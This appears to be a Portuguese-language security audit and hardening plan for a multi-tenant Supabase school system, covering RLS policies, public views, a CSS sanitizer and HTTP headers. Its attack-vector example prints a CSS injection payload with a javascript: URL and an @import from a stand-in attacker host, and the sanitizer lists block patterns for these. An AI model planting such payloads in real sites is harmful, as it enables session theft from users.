

# Plano: Hardening de Segurança Completo do Sistema

## Resumo Executivo

Após auditoria completa do sistema, identifiquei vulnerabilidades e gaps de segurança que precisam ser corrigidos para proteção total dos dados dos usuários, escolas e responsáveis.

---

## Vulnerabilidades Identificadas

### Nível CRÍTICO (Correção Imediata)

| ID | Vulnerabilidade | Risco | Impacto |
|----|-----------------|-------|---------|
| SEC-01 | CSS Injection via `custom_css` | CRÍTICO | XSS pode roubar sessões de usuários |
| SEC-02 | Proteção de senhas vazadas desabilitada | ALTO | Usuários podem usar senhas comprometidas |
| SEC-03 | View `security_summary` sem políticas RLS | MÉDIO | Métricas de segurança expostas |

### Nível ALTO (Correção Prioritária)

| ID | Vulnerabilidade | Risco |
|----|-----------------|-------|
| SEC-04 | `school_website_config` expõe dados sensíveis | Vazamento de tenant_id, telefones, domínios |
| SEC-05 | Políticas RLS com `USING (true)` em INSERT | Logs podem ser injetados por qualquer um |
| SEC-06 | Security Definer View existente | Pode expor dados indevidamente |

### Nível MÉDIO (Melhorias de Hardening)

| ID | Melhoria |
|----|----------|
| SEC-07 | Extensões no schema public |
| SEC-08 | `subscription_plans` expõe estratégia de preços |
| SEC-09 | Views públicas sem RLS explícito |

---

## Correções a Implementar

### 1. Sanitizar CSS Customizado (SEC-01)

**Problema**: CSS customizado é injetado diretamente via `dangerouslySetInnerHTML` sem sanitização.

**Vetor de Ataque**:
```css
/* CSS malicioso pode incluir */
body { background: url("javascript:alert('XSS')"); }
@import url("https://attacker.com/steal-data.css");
```

**Solução**: Criar função de sanitização de CSS que remove propriedades perigosas:

```typescript
// src/lib/cssSanitizer.ts
export function sanitizeCSS(css: string): string {
  if (!css) return '';
  
  // Remove @import, javascript:, expression(), url() com protocolos perigosos
  const dangerous = [
    /@import\s+/gi,
    /javascript:/gi,
    /expression\s*\(/gi,
    /behavior\s*:/gi,
    /-moz-binding\s*:/gi,
    /url\s*\(\s*["']?\s*data:/gi,
    /url\s*\(\s*["']?\s*javascript:/gi,
  ];
  
  let sanitized = css;
  for (const pattern of dangerous) {
    sanitized = sanitized.replace(pattern, '/* BLOCKED */');
  }
  
  return sanitized;
}
```

### 2. Habilitar Proteção de Senhas Vazadas (SEC-02)

**Ação**: Configurar via Supabase Auth settings para verificar senhas contra base HaveIBeenPwned.

### 3. Criar View Pública Segura para Websites (SEC-04)

**Problema**: `school_website_config` expõe `tenant_id`, `custom_domain`, `whatsapp` para público.

**Solução**: Criar view que expõe apenas campos necessários para renderização pública:

```sql
CREATE OR REPLACE VIEW public.school_website_public AS
SELECT 
  slug,
  enabled,
  hero_title,
  hero_subtitle,
  hero_cta_primary,
  hero_cta_secondary,
  hero_background_url,
  hero_badge_text,
  about_title,
  about_description,
  about_features,
  differentials,
  gallery_images,
  testimonials,
  prematricula_enabled,
  prematricula_title,
  primary_color,
  secondary_color,
  accent_color,
  font_family,
  footer_text,
  show_powered_by,
  social_links
  -- OMITE: tenant_id, custom_domain, whatsapp, contact_email, etc.
FROM school_website_config
WHERE enabled = true;
```

### 4. Restringir Políticas de Logs (SEC-05)

**Problema**: Tabelas de log permitem INSERT com `true` (qualquer um pode inserir).

**Solução**: Restringir INSERT para service_role ou funções específicas:

```sql
-- Remover política permissiva
DROP POLICY IF EXISTS "Service role can insert webhook logs" ON webhook_logs;

-- Criar política restritiva (apenas via Edge Functions com service_role)
CREATE POLICY "Only service role can insert webhook logs" 
ON webhook_logs FOR INSERT 
TO service_role
WITH CHECK (true);
```

### 5. Corrigir Security Definer View (SEC-06)

**Problema**: Views com SECURITY DEFINER executam com permissões do criador, não do usuário.

**Solução**: Converter para SECURITY INVOKER (padrão seguro):

```sql
-- Recriar views com security_invoker = true
ALTER VIEW escola_public_branding SET (security_invoker = true);
ALTER VIEW school_website_config_public SET (security_invoker = true);
ALTER VIEW school_website_public_safe SET (security_invoker = true);
ALTER VIEW security_summary SET (security_invoker = true);
```

### 6. Adicionar Políticas RLS às Views Públicas (SEC-09)

```sql
-- security_summary - apenas platform_admin
CREATE POLICY "Platform admins can view security summary"
ON security_summary FOR SELECT
USING (is_platform_admin(auth.uid()));

-- escola_public_branding - leitura pública (intencional para branding)
CREATE POLICY "Public can read escola branding"
ON escola_public_branding FOR SELECT
USING (true);
```

### 7. Rate Limiting Adicional em Edge Functions

Já existe rate limiting em `portal-consulta-cpf`. Adicionar em outras funções públicas:

- `register-prematricula` (já tem validação Zod, adicionar rate limit)
- `asaas-webhook` (tem validação de token)
- `stripe-webhook` (tem validação de assinatura)

### 8. Headers de Segurança HTTP

Adicionar via Netlify `_headers` ou configuração:

```text
/*
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  X-XSS-Protection: 1; mode=block
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## Arquivos a Modificar

| Arquivo | Mudança |
|---------|---------|
| `src/lib/cssSanitizer.ts` | NOVO - Função de sanitização de CSS |
| `src/pages/EscolaPublica.tsx` | Usar sanitizador de CSS |
| `public/_headers` | Adicionar headers de segurança HTTP |
| Migration SQL | Views seguras, políticas RLS corrigidas |

---

## Validações Já Existentes (Mantidas)

O sistema já possui boas práticas implementadas:

| Controle | Status |
|----------|--------|
| RLS em todas as tabelas | OK |
| Funções SECURITY DEFINER para roles | OK |
| Validação JWT em Edge Functions | OK |
| Token de webhook Asaas | OK |
| Assinatura de webhook Stripe | OK |
| Rate limiting em portal CPF | OK |
| Validação Zod em inputs | OK |
| DOMPurify para HTML renderizado | OK |
| Proteção do system owner | OK |
| Auditoria de impersonation | OK |
| Tenant isolation via `get_user_tenant_id()` | OK |
| Secrets em `tenant_gateway_secrets` bloqueados | OK |
| 2FA disponível | OK |

---

## Garantias de Segurança para Produção

| Regra | Implementação |
|-------|---------------|
| Zero downtime | Migrations são aditivas |
| Sem perda de dados | Apenas adição de restrições |
| Retrocompatível | Views públicas mantêm campos esperados |
| Auditável | Todas as mudanças logadas |

---

## Checklist de Conformidade LGPD

| Requisito | Status |
|-----------|--------|
| Dados pessoais protegidos por tenant | OK via RLS |
| Acesso logado (audit_logs) | OK |
| Criptografia em trânsito (HTTPS) | OK |
| Criptografia em repouso | OK (Supabase) |
| Direito de acesso/exclusão | Implementar portal |
| Minimização de dados públicos | Melhorar com views |

---

## Seção Técnica Detalhada

### Fluxo de Validação de Segurança

```text
┌─────────────────────────────────────────────────────────────────┐
│  REQUEST                                                        │
│      ↓                                                          │
│  1. HTTPS (TLS 1.3) - Criptografia em trânsito                 │
│      ↓                                                          │
│  2. Headers de Segurança (X-Frame-Options, CSP, etc.)          │
│      ↓                                                          │
│  3. Rate Limiting (Edge Function ou Supabase)                   │
│      ↓                                                          │
│  4. Autenticação (JWT Token via Supabase Auth)                 │
│      ↓                                                          │
│  5. Autorização (RLS + has_role() + get_user_tenant_id())      │
│      ↓                                                          │
│  6. Validação de Input (Zod schemas, sanitização)              │
│      ↓                                                          │
│  7. Execução (Query isolada por tenant)                        │
│      ↓                                                          │
│  8. Auditoria (audit_logs, security_access_logs)               │
│      ↓                                                          │
│  RESPONSE (dados filtrados por tenant)                         │
└─────────────────────────────────────────────────────────────────┘
```

### Hierarquia de Roles

```text
platform_admin (victor***@outlook.com)
    ├── Acesso total ao sistema
    ├── Gerencia tenants
    ├── Gerencia secrets
    └── Impersonation (com auditoria)

admin (por tenant)
    ├── CRUD completo no tenant
    ├── Gerencia usuários do tenant
    └── Configura gateway de pagamento

financeiro (por tenant)
    ├── Faturas, pagamentos, despesas
    └── Relatórios financeiros

secretaria (por tenant)
    ├── Alunos, responsáveis
    └── Turmas, cursos

staff (por tenant)
    └── Acesso básico de leitura
```

### Proteções de Webhook

| Gateway | Validação |
|---------|-----------|
| Stripe | HMAC SHA-256 signature + timestamp (5min tolerance) |
| Asaas | Token secreto via header `asaas-access-token` |

---

## Resultado Esperado

Após implementação:

- Zero vulnerabilidades XSS/CSS Injection
- Proteção contra senhas vazadas
- Dados sensíveis não expostos publicamente
- Logs protegidos contra injeção
- Views com segurança adequada
- Headers HTTP de segurança
- Conformidade com LGPD

